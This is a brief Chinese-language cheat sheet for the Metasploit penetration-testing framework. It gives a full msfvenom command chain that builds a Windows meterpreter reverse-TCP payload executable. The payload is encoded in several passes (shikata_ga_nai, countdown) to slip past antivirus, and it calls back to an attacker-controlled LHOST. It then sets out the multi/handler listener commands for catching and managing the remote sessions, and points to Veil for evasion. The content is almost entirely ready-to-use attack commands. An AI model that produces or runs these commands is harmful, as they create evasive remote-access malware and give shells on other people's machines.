# Metasploit 攻击平台(Beta)


## msfvenom 

### 生成 payload

参考文档: <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>

windows 平台
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.78.128 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o Desktop/payload.exe
```

### 监听

参考文档: <https://xz.aliyun.com/t/3007>

步骤：

1. 启动PostgreSQL数据库服务：service postgresql start
2. 初始化Metasploit数据库:msfdb init
3. 查看数据库联接情况:msfconsole db_status
4. 建立数据库缓存:msfconsole db_rebuild_cache

```sh
msf > use exploit/multi/handler
msf > exploit(handler) > set payload windows/x64/meterpreter/reverse_tcp
msf > exploit(handler) > show options

msf exploit(handler) > set LHOST 172.16.0.4
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > exploit -j -z  
# -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)

msf exploit(handler) > jobs  # 查看后台攻击任务 
msf exploit(handler) > kill <id>  #停止某后台攻击任务 
msf exploit(handler) > sessions -l  #(查看会话)

msf exploit(handler) > sessions -i 2   #选择会话
msf exploit(handler) > sessions -k 2   #结束会话

Ctrl+z  #把会话放到后台
Ctrl+c  #结束会话
```

### 免杀

参考文档：<https://github.com/Veil-Framework/Veil>


